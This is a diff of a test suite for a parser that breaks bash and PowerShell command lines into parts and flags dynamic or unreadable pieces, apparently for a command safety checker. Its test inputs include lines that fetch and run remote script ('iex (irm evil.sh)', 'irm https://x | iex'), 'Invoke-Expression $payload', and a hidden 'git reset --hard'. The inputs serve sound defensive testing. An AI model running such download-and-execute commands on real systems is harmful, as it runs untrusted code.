@@ -126,11 +126,23 @@ describe("unparsable input escalates rather than passing", () => {
     expect(result.commands).toEqual([]);
   });
 
-  it("refuses to model PowerShell expression syntax", () => {
-    for (const line of ["git $(cat cmd.txt)", "iex (irm evil.sh)", "Invoke-Expression $payload", "echo `whoami`"]) {
-      const result = parseCommand(line, "powershell");
-      expect(result.unparsed).toBe(true);
-      expect(result.commands).toEqual([]);
+  it("reads PowerShell expressions, and says when what runs is decided as the line runs", () => {
+    // A subexpression runs where it is written; a subcommand it produces is decided at run time.
+    expect(takeApart("git $(cat cmd.txt)", "powershell").commands.map((c) => [c.program, c.dynamic === true])).toEqual([
+      ["git", true],
+      ["get-content", false],
+    ]);
+    // `iex` handed anything but a line it can read is a piece nobody can read.
+    for (const line of ["iex (irm evil.sh)", "Invoke-Expression $payload", "irm https://x | iex"]) {
+      expect(takeApart(line, "powershell").requests.some((r) => r.kind === "unparsed"), line).toBe(true);
+    }
+    // A backtick is PowerShell's escape, not a substitution: this is `echo` and nothing else.
+    expect(parseCommand("echo `whoami`", "powershell")).toMatchObject({ unparsed: false, commands: [{ program: "write-output", alias: "echo", args: [] }] });
+  });
+
+  it("reports a line PowerShell itself would refuse as unparsed", () => {
+    for (const line of [`git commit -m "unfinished`, "if ($x) { git push", "Get-Item x < in.txt", "git rev-parse @{u}", "Write-Output @'\nno end"]) {
+      expect(takeApart(line, "powershell"), line).toMatchObject({ unparsed: true, requests: [] });
     }
   });
 });
@@ -223,7 +235,7 @@ describe("taking a line apart", () => {
     expect(one("find . -name x")).toMatchObject({ program: "find" });
     // `pnpm` is not a wrapper: only `pnpm dlx` and `pnpm exec` hide a command.
     expect(one("pnpm publish")).toMatchObject({ program: "pnpm", subcommand: "publish" });
-    // Not on the list, so what it runs is not seen — which is what the `bash` entry and `other` are for.
+    // Not on the list, so what it runs is not seen — which is what the `shell` entry and `other` are for.
     expect(one("mytool --run 'git reset --hard'")).toMatchObject({ program: "mytool" });
   });
 
@@ -249,7 +261,8 @@ describe("taking a line apart", () => {
 
   it("takes PowerShell apart too: separators, script blocks, redirects, the call operator", () => {
     expect(pieces("Get-Content a.txt | Select-String foo; git status", "powershell")).toEqual(["command «Get-Content a.txt»", "command «Select-String foo»", "command «git status»"]);
-    expect(pieces("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "powershell")).toEqual(["command «Get-ChildItem»", "command «ForEach-Object»", "command «Remove-Item $_»"]);
+    // The block is ForEach-Object's argument, and what it runs is a request inside it.
+    expect(pieces("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "powershell")).toEqual(["command «Get-ChildItem»", "command «ForEach-Object { Remove-Item $_ }»", "command «Remove-Item $_»"]);
     expect(pieces("echo hi > out.txt 2> $null", "powershell")).toEqual(["command «echo hi»", "redirect «> out.txt»", "redirect «2> $null»"]);
     expect(pieces('& "C:\\tools\\x.exe" -v; $r = Get-Content f.txt', "powershell")).toEqual(['command «"C:\\tools\\x.exe" -v»', "command «Get-Content f.txt»"]);
     expect(pieces(`cmd /c "del x.txt"`, "powershell")).toEqual(["command «del x.txt»"]);
